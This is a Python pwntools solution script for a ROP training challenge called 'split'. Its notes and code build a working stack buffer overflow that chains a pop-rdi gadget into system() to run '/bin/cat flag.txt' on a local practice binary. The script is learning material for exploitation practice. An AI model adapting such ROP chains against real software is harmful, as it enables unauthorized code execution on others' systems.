#!/usr/bin/python3
from pwn import *

'''
Notes:
    partial relro   $$$ 
    pie disabled    $$$
    nx true
    no canary       $$$
    
    function sym.pwnme
        buf = 0x20 == 32 bytes
        8 bytes for rbp overwrite
    junk payload of 40 to start overflow
    section..got.plt
        /bin/cat str
        flag.txt str
    search for strings
    full string "/bin/cat flag.txt" @ 0x00601060
    call to system inside of sym.usefulFunction @ 0x0040074b
'''

# define stuff
junk = (b"A"*40)
pwnme_addr = int("0x004006e8", 16)

catflag = int("0x00601060", 16)
system_call = int("0x0040074b", 16)

ret_addr = int("0x000000000040053e", 16)
pop_rdi = int("0x00000000004007c3", 16)

# start payload
payload = junk
payload += p64(pop_rdi) + p64(catflag) + p64(system_call)

# run process
context.binary = binary = ELF("./split", checksec=False)
p = process()
p.recvuntil(b">")
p.sendline(payload)
output = p.recvall().split(b"\n")
print(output[1].decode("utf-8"))
